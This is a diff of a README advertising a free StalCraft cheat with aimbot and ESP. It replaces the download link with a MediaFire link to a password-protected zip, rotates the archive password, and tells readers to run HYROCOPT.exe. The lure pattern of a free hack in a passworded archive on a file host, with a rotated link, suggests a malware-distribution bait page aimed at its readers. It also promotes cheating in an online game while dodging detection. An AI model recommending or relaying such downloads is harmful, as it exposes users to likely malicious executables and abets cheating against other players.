@@ -1,11 +1,9 @@
 # Free-Premium-StalCraft-Hack-HYROCOPT-cheats-Free-Haks-Esp-AimBot
 Our cheat supports windows 7/10/11
-
 # Download
-|[Download](https://sites.google.com/view/nccrakc/main-page)|
+|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
 |:-------------|
-Passwrod: 2077
-
+Passwrod: 23
 
 # StalCraft Aimbot Features
 This hack is not pasted. You will be fine until eternity if you use low fov settings and legitimate aimbot settings. There are many settings on the GUI’s aimbot side where you can make lots of changes. Our recommendation is to not use RAGE settings, but to use LEGIT hack settings from the menu.
@@ -52,3 +50,4 @@ Open HYROCOPT.exe.
 Open Steam and launch StalCraft.
 
 Enjoy
+# PASSWORD FOR ZIP ARCHIVE: 23
